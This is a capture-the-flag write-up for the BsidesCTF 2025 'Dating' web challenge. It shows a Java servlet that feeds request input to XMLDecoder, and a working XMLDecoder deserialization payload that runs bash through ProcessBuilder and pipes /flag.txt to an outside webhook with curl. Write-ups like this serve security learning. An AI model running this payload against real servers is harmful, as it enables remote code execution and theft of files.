--------------------

### CTF-: BsidesCTF 2025

--------------------

![image](https://github.com/user-attachments/assets/5758bd60-e622-47de-9566-4e408ae2f6f7)

---------------------

### Challenges

----------------------

- Web-:
  - Dating

-----------------------

### Dating

-----------------------

![image](https://github.com/user-attachments/assets/a7046cc7-6849-408c-8aab-17124266f0a6)

-----------------------

- The challenge contains this java file `ProfileServlet.java`.

```java
package com.example.dragon;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.beans.XMLDecoder;
import java.io.IOException;

@WebServlet("/ProfileServlet")
public class ProfileServlet extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/plain");

        try {
            XMLDecoder decoder = new XMLDecoder(request.getInputStream());
            Object dragonData = decoder.readObject();
            decoder.close();

            response.getWriter().write("Profile received for: " + dragonData.toString());
        } catch (Exception e) {
            response.getWriter().write("Error processing profile: " + e.getMessage());
        }
    }
}
```

- My eyes caught this  line `XMLDecoder decoder = new XMLDecoder(request.getInputStream());`.This class `XML Decoder` in java is vulnerable to `Insecure Deserialization` which can lead to RCE.A specially crafted XML payload can be used to invoke arbitrary java classes and methods to trigger RCE on the server.
- My Xml Payload-:

```xml
<java version="1.8.0" class="java.beans.XMLDecoder">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0">
	<string>/bin/bash</string>
      </void>
      <void index="1">
	<string>-c</string>
      </void>
      <void index="2">
	      <string>cat /flag.txt | /usr/bin/curl https://www.postb.in/1745777549695-6946147335693 -d @-</string>
      </void>
    </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```

- The payload invokes class `java.lang.ProcessBuilder` which runs the `bash` binary with `-c` option to run a statement.Since I can't get an output, I interacted with a web hook with curl which serves the result of the executed command `cat /flag.txt` as `POST` data.

![image](https://github.com/user-attachments/assets/3cff1ab8-2554-4846-a2f9-c49bb10658f0)

- Web hook's result-:

![image](https://github.com/user-attachments/assets/5aa72db4-31a6-4dfb-93df-3a6c0470c2e5)

- Flag-:```CTF{helping-dragons-find-love-since-2025}```

